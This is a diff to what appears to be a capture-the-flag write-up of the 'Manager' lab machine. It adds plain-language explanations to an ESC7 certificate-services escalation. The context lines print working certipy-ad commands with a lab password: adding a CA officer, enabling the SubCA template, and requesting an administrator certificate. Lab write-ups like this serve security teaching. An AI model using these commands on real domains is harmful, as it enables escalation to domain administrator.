@@ -692,6 +692,8 @@ The following steps showcase the exploitation of ESC7:
 certipy-ad ca -dc-ip 10.129.116.131 -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' -ca manager-DC01-CA -add-officer raven
 ```
 
+Leveraging Raven's ManageCA rights, she elevates her permissions to become someone who can approve certificate requests.
+
 #### Output:
 
 ```
@@ -704,6 +706,8 @@ certipy-ad ca -dc-ip 10.129.116.131 -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!
 certipy-ad ca -dc-ip 10.129.116.131 -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' -ca manager-DC01-CA -enable-template SubCA
 ```
 
+Raven enables the SubCA template, that allows requesting certificates for any particular user using a UPN, rather than predefined users used in other templates.
+
 #### Output:
 
 ```
@@ -715,6 +719,8 @@ certipy-ad ca -dc-ip 10.129.116.131 -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!
 ```
 certipy-ad req -dc-ip 10.129.116.131 -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' -ca manager-DC01-CA -template SubCA -upn administrator@manager.htb
 ```
+
+
 
 #### Output:
 
